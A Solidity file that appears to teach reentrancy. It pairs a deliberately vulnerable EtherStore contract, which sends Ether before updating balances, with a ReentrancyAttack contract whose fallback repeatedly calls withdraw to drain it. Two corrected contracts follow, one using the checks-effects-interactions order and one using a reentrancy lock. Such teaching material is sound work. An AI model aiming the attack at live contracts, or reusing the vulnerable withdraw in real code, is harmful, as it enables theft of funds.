pragma solidity ^0.6.10;

contract EtherStore {
	mapping(address => uint) public balances;

	function deposit() public payable {
		balances[msg.sender] += msg.value;
	}

	function withdraw(uint _amount) public {
		require(balances[msg.sender] >= _amount, "Not enough balance to be withdraw");
		
		(bool sent,) = msg.sender.call{value: _amount}("");
		require(sent, "Failed to send Ether");

		balances[msg.sender] -= _amount;
	}

	function getBalance() public view returns (uint) {
		return address(this).balance;
	}
}

contract ReentrancyAttack {
	EtherStore public etherStore;

	constructor(address _etherStoreAddress) public {
		etherStore = EtherStore(_etherStoreAddress);
	}

	fallback() external payable {
		if (address(etherStore).balance >= 1 ether) {
			etherStore.withdraw(1 ether);
		} 
	}

	function attack() external payable {
		require(msg.value >= 1 ether);

		etherStore.deposit{value: 1 ether}();
		etherStore.withdraw(1 ether);
	}

	function getBalance() public view returns (uint) {
		return address(this).balance;
	}
}

contract EtherStoreSecure1 {
	mapping(address => uint) public balances;

	function deposit() public payable {
		balances[msg.sender] += msg.value;
	}

	function withdraw(uint _amount) public {
		require(balances[msg.sender] >= _amount, "Not enough balance to be withdraw");
		
		balances[msg.sender] -= _amount;

		(bool sent,) = msg.sender.call{value: _amount}("");
		require(sent, "Failed to send Ether");
	}

	function getBalance() public view returns (uint) {
		return address(this).balance;
	}
}

contract EtherStoreSecure2 {
	mapping(address => uint) public balances;

	function deposit() public payable {
		balances[msg.sender] += msg.value;
	}

	bool internal locked;

	modifier noReentrant() {
		require(!locked, "No re-entrancy");
		locked = true;
		_;
		locked = false;
	}

	function withdraw(uint _amount) public noReentrant {
		require(balances[msg.sender] >= _amount, "Not enough balance to be withdraw");
		
		(bool sent,) = msg.sender.call{value: _amount}("");
		require(sent, "Failed to send Ether");
		
		balances[msg.sender] -= _amount;
	}

	function getBalance() public view returns (uint) {
		return address(this).balance;
	}
}
